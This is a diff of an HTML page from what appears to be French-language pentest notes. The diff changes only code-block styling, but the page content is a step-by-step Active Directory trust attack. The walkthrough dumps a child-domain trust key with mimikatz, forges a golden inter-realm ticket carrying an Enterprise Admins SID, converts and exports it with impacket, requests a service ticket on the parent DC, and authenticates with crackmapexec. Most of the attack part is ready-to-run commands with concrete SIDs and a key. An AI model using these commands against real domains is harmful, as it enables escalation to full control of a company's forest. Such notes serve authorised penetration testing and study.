@@ -7666,12 +7666,12 @@
 
 <h3 id="trust-bidirectionnal-child-parent">trust bidirectionnal, child -&gt; parent</h3>
 <p>Une fois qu'on a le contrôle d'un premier DC, s'y connecter et avec mimikatz:</p>
-<pre><code class="language-powershell">lsadump::trust /patch
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">trust</span> <span class="p">/</span><span class="n">patch</span>
+</span></code></pre></div>
 <p>Ce qui permet de trouver les SID dont nous auront besoin, ainsi que la trustkey.</p>
 <p>Ensuite, toujours avec mimikatz:</p>
-<pre><code class="language-powershell">kerberos::golden /user:Administrator /domain:child.internal.local /sid:S-1-5-21-3056178012-3972705859-491075245 /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:bd0e4bd0efde459162c036970ef3489e /target:internal.local /ticket:C:\Windows\test.kirbi /service:krbtgt
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">child</span><span class="p">.</span><span class="n">internal</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3056178012</span><span class="p">-</span><span class="n">3972705859</span><span class="p">-</span><span class="n">491075245</span> <span class="p">/</span><span class="n">sids</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2734290894</span><span class="p">-</span><span class="n">461713716</span><span class="p">-</span><span class="n">141835440</span><span class="p">-</span><span class="n">519</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">bd0e4bd0efde459162c036970ef3489e</span> <span class="p">/</span><span class="n">target</span><span class="p">:</span><span class="n">internal</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">krbtgt</span>
+</span></code></pre></div>
 <blockquote>
 <p>/domain: le domaine dont nous avons le contrôle<br />
 /sid: le sid du domaine dont nous avons le contrôle<br />
@@ -7680,20 +7680,20 @@
 /rc4: la trustkey</p>
 </blockquote>
 <p>On récupère ensuite le .kirbi sur notre host et on le converti en .ccache:</p>
-<pre><code class="language-bash">impacket-ticketconverter test.kirbi test.ccache
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>impacket-ticketconverter<span class="w"> </span>test.kirbi<span class="w"> </span>test.ccache
+</span></code></pre></div>
 <p>On l'exporte:</p>
-<pre><code class="language-bash">export KRB5CCNAME=test.ccache
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>test.ccache
+</span></code></pre></div>
 <p>Nous pouvons ensuite faire le request d'un TGS sur le DC principal:</p>
-<pre><code class="language-bash">impacket-getST -k -no-pass -spn HOST/DC01 internal.local/Administrator@child.internal.local
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>impacket-getST<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-spn<span class="w"> </span>HOST/DC01<span class="w"> </span>internal.local/Administrator@child.internal.local
+</span></code></pre></div>
 <p>On l'exporte à son tour -&gt; profit.</p>
 <blockquote>
 <p>/!\ nous sommes toujours Administrateur du domaine child, mais avec les droits sur le domaine parent, ce qui implique qu'il faut spécifier le nom du domaine dans certains cas, typiquement:</p>
 </blockquote>
-<pre><code class="language-bash">crackmapexec smb 192.168.210.10 --use-kcache -d child.internal.local
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.210.10<span class="w"> </span>--use-kcache<span class="w"> </span>-d<span class="w"> </span>child.internal.local
+</span></code></pre></div>
 
 
 
@@ -7740,7 +7740,7 @@
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
